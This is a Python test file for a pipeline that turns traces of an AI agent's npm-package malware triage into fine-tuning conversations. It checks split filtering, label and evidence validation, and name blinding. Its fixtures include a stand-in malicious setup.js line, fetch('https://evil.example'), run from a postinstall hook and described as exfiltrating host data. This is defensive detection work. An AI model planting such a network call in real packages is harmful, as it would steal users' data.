import csv
import json
from pathlib import Path

import pytest

from agent.semantics import BLIND_ALIAS
from agent.trace import trace_filename
from experiments.dataset import FIELDS
from experiments.encoding import encode_event, encode_result
from experiments.extract_sft import (
    _config_tools,
    build_sft_conversation,
    extract_sft_dataset,
    load_train_partition,
)


def _write_labels(path: Path) -> None:
    rows = [
        {"id": "tr1", "name": "secret-leak-pkg", "version": "1.0.0", "label": "malicious", "behavior_main": "steals",
         "technique": "network-request", "file": "setup.js", "lines": "1-3", "source": "https://example.invalid/1",
         "split": "train", "cluster": "c-train-1"},
        {"id": "tr2", "name": "wrong-label-pkg", "version": "1.0.0", "label": "benign", "behavior_main": "ok",
         "technique": "print-output", "file": "index.js", "lines": "1", "source": "https://example.invalid/2",
         "split": "train", "cluster": "c-train-2"},
        {"id": "tr3", "name": "bad-ev-pkg", "version": "1.0.0", "label": "benign", "behavior_main": "ok",
         "technique": "print-output", "file": "index.js", "lines": "1", "source": "https://example.invalid/3",
         "split": "train", "cluster": "c-train-3"},
        {"id": "dv1", "name": "dev-pkg", "version": "1.0.0", "label": "benign", "behavior_main": "ok",
         "technique": "print-output", "file": "index.js", "lines": "1", "source": "https://example.invalid/4",
         "split": "dev", "cluster": "c-dev-1"},
        {"id": "ts1", "name": "test-pkg", "version": "1.0.0", "label": "malicious", "behavior_main": "steals",
         "technique": "network-request", "file": "index.js", "lines": "1", "source": "https://example.invalid/5",
         "split": "test", "cluster": "c-test-1"},
    ]
    with path.open("w", encoding="utf-8", newline="") as stream:
        writer = csv.DictWriter(stream, FIELDS)
        writer.writeheader()
        writer.writerows(rows)


def _write_run_item(run_dir: Path, pkg: str, verdict: dict, final_label: str, checks: list[dict], *, encode: bool = True) -> None:
    tfile = trace_filename(pkg)
    events = [
        {"type": "run_start", "model": "qwen3.5:9b", "config_name": "A-LLM-X", "max_steps": 15},
        {"type": "tool_call", "tool": "read_manifest", "args": {"package": "/tmp/work/package"}},
        {"type": "tool_result", "tool": "read_manifest", "ok": True, "summary": "OK",
         "data_preview": json.dumps({"name": pkg.rpartition("@")[0], "scripts": {"postinstall": "node setup.js"}}),
         "untrusted": True, "duration_ms": 1},
        {"type": "tool_call", "tool": "extract_indicators", "args": {}},
        {"type": "tool_result", "tool": "extract_indicators", "ok": True, "summary": "Install source indicator scan",
         "data_preview": json.dumps({"indicators": [{"file": "setup.js", "line": 2, "type": "network"}]}),
         "untrusted": True, "duration_ms": 1},
        {"type": "thought", "text": f"Need to inspect setup.js for {pkg.rpartition('@')[0]}"},
        {"type": "tool_call", "tool": "read_file", "args": {"file": "setup.js", "start": 1, "end": 50}},
        {"type": "tool_result", "tool": "read_file", "ok": True, "summary": "OK",
         "data_preview": f"// {pkg.rpartition('@')[0]}\nfetch('https://evil.example')\n",
         "untrusted": True, "duration_ms": 2},
        {"type": "verdict", "verdict": verdict, "valid": True, "validation_errors": []},
        # Host-side evidence check call/result must be stripped from training messages
        {"type": "tool_call", "tool": "read_file", "args": {"file": "setup.js", "start": 2, "end": 2}},
        {"type": "tool_result", "tool": "read_file", "ok": True, "summary": "Evidence check",
         "data_preview": "fetch('https://evil.example')", "untrusted": True, "duration_ms": 1},
        {"type": "decision", "threshold": 0.95, "evidence_checks": checks, "final_label": final_label,
         "final_action": "deny" if final_label == "malicious" else "approve", "dry_run": True,
         "rule": "R3", "reasons": [], "inputs": {}},
    ]
    if encode:
        lines = [json.dumps(encode_event(e), ensure_ascii=False) for e in events]
    else:
        lines = [json.dumps(e, ensure_ascii=False) for e in events]
    (run_dir / tfile).write_text("\n".join(lines) + "\n", encoding="utf-8")

    result = {
        "package": pkg,
        "variant": "A-LLM-X",
        "model": "qwen3.5:9b",
        "trace": tfile,
        "status": "ok",
        "steps": 2,
        "verdict": verdict,
        "errors": [],
        "decision": {"label": final_label, "action": "deny", "rule": "R3"},
    }
    slug = pkg.replace("/", "_").replace("@", "_")
    payload = encode_result(result) if encode else result
    (run_dir / f"{slug}.json").write_text(json.dumps(payload, ensure_ascii=False), encoding="utf-8")


def test_load_train_partition_rejects_dev_and_test(tmp_path):
    labels = tmp_path / "labels.csv"
    _write_labels(labels)
    with pytest.raises(ValueError, match="split='train'"):
        load_train_partition(labels, split="dev")
    with pytest.raises(ValueError, match="split='train'"):
        load_train_partition(labels, split="test")


def test_extract_sft_filters_splits_labels_evidence_and_blinds(tmp_path):
    labels = tmp_path / "labels.csv"
    _write_labels(labels)
    run_dir = tmp_path / "run"
    run_dir.mkdir()

    ok_verdict = {
        "package": "secret-leak-pkg@1.0.0",
        "label": "malicious",
        "confidence": 0.96,
        "description": "Exfiltrates host data on postinstall",
        "behaviors": [{
            "behavior": "sends request on install",
            "technique": "network-request",
            "severity": "high",
            "evidence": {"file": "setup.js", "lines": "2"},
            "analysis": "secret-leak-pkg sends data to remote host",
            "impact": "data exfiltration",
        }],
        "action": "deny",
        "remediation": ["Deny install scripts"],
    }
    _write_run_item(run_dir, "secret-leak-pkg@1.0.0", ok_verdict, "malicious", [{"file": "setup.js", "lines": "2", "exists": True}])
    _write_run_item(run_dir, "wrong-label-pkg@1.0.0", {**ok_verdict, "package": "wrong-label-pkg@1.0.0"}, "malicious",
                    [{"file": "index.js", "lines": "1", "exists": True}])
    _write_run_item(run_dir, "bad-ev-pkg@1.0.0", {**ok_verdict, "package": "bad-ev-pkg@1.0.0", "label": "benign"}, "benign",
                    [{"file": "index.js", "lines": "1", "exists": False}])
    _write_run_item(run_dir, "dev-pkg@1.0.0", {**ok_verdict, "package": "dev-pkg@1.0.0", "label": "benign"}, "benign",
                    [{"file": "index.js", "lines": "1", "exists": True}])
    _write_run_item(run_dir, "test-pkg@1.0.0", {**ok_verdict, "package": "test-pkg@1.0.0"}, "malicious",
                    [{"file": "index.js", "lines": "1", "exists": True}])

    out_path = tmp_path / "sft" / "train.jsonl"
    summary = extract_sft_dataset(run_dir, labels, out_path, config_variant="A-SLM-X")
    assert summary["kept"] == 1
    assert summary["skipped"]["forbidden_split"] == 2
    assert summary["skipped"]["label_mismatch"] == 1
    assert summary["skipped"]["unverified_evidence"] == 1

    lines = [json.loads(line) for line in out_path.read_text(encoding="utf-8").splitlines() if line.strip()]
    assert len(lines) == 1
    rec = lines[0]
    assert rec["split"] == "train"
    assert rec["package"] == "secret-leak-pkg@1.0.0"
    roles = [m["role"] for m in rec["messages"]]
    assert roles == ["system", "user", "assistant", "tool", "assistant"]
    # Package name blinded inside conversation & verdict JSON; Evidence check stripped
    convo_text = json.dumps(rec["messages"], ensure_ascii=False)
    assert "secret-leak-pkg" not in convo_text
    assert BLIND_ALIAS in convo_text
    assert "Evidence check" not in convo_text
    assert len(rec["tools"]) == 9


def test_config_tools_reads_a_slm_x():
    tools = _config_tools("A-SLM-X")
    assert tools == (
        "read_manifest", "read_file", "deobfuscate", "extract_indicators",
        "inspect_scripts", "trace_requires", "trace_flow", "search_code", "decode_literal",
    )


def test_build_sft_conversation_handles_missing_valid_verdict():
    assert build_sft_conversation("foo@1.0.0", {}, [{"type": "run_start"}]) is None
